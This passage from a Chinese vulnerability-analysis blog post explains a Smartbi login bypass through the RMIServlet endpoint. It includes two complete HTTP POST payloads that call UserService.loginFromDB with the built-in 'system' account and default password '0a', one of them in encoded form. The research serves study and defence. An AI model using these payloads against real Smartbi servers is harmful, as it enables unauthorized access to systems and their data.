+<p>​       那么有人会问你传入的这三个参数分别是什么呢？</p>
+<p>​        前两个看了代码之后很好理解吧，他们两个的目的就是为了绕过再次验证用户是否登录。那第三个参数中传入的”system”和”0a”分别是内置用户的账户和密码。一共有三个默认账户，本文仅用system举例，感兴趣的师傅也可以试试其他两个，但是他们的默认密码都是“0a”。</p>
+<p>​       那我们再来讲和<strong>第一种</strong>比较相似的<strong>第三种</strong>传参方法，也就是用<code>encode</code>的方式传入：</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/c27882fe048ddfbbbcea101baf5b478d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       他不管是接收还是处理方式都和第一种很像，只不过他是通过POST的提交，之后也是先绕过<code>needToCheck()</code>方法，进入<code>doPost</code>-&gt;<code>loginFromDB()</code>，返回<strong>loginSucceed</strong>。</p>
+<p>​       我提供一下我的payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>60<br><br><span class="language-awk">encode=zDp4Wp4gRip+Sw-R6x4wdTV+<span class="hljs-regexp">/JV/uu</span>D2Dkpd<span class="hljs-regexp">/uu/u</span>t<span class="hljs-regexp">/uu7(/uu</span><span class="hljs-regexp">/JT</span></span><br></code></pre></td></tr></table></figure>
+
+<p>​       那么我们再看第二种，直接用POST的方式传入，这种方式是最简单直接的：</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/8a25d1b1fa4f397f9a1590ef59962264.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       他先会接收<code>className</code>和<code>methodName</code>这两个用于<code>needToCheck</code>,如果后续检验没问题，他也会进入到doPOST之中，最终也会接收<code>params</code>：</p>
+<p><img src="https://ice.frostsky.com/2023/08/15/3f3de12e65e7172678f06dce83f0c7f0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>​       之后也是同样的处理方式。。。。。。。</p>
+<p>​       下附post方式的payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.65.14.247:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080/smartbi/vision/index.jsp<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>67<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.65.14.247:18080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>FQPassword=; JSESSIONID=5A8FD28B6C3E7FABBC20B8C8C67C77C3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UserService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>loginFromDB<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>——不及跬步无以至千里，不积小流无以成江河。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Smartbi内置用户绕过浅析</div>
+      <div>http://example.com/2023/07/21/Smartbi内置用户绕过浅析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Yuanyi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/15/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI/" title="没人比我更懂RMI(上)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">没人比我更懂RMI(上)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/21/Ez%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/" title="Ez反序列化pop链构造思路">
+                        <span class="hidden-mobile">Ez反序列化pop链构造思路</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/shubiao.js"></script>
+<script src="/js/Hcaidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
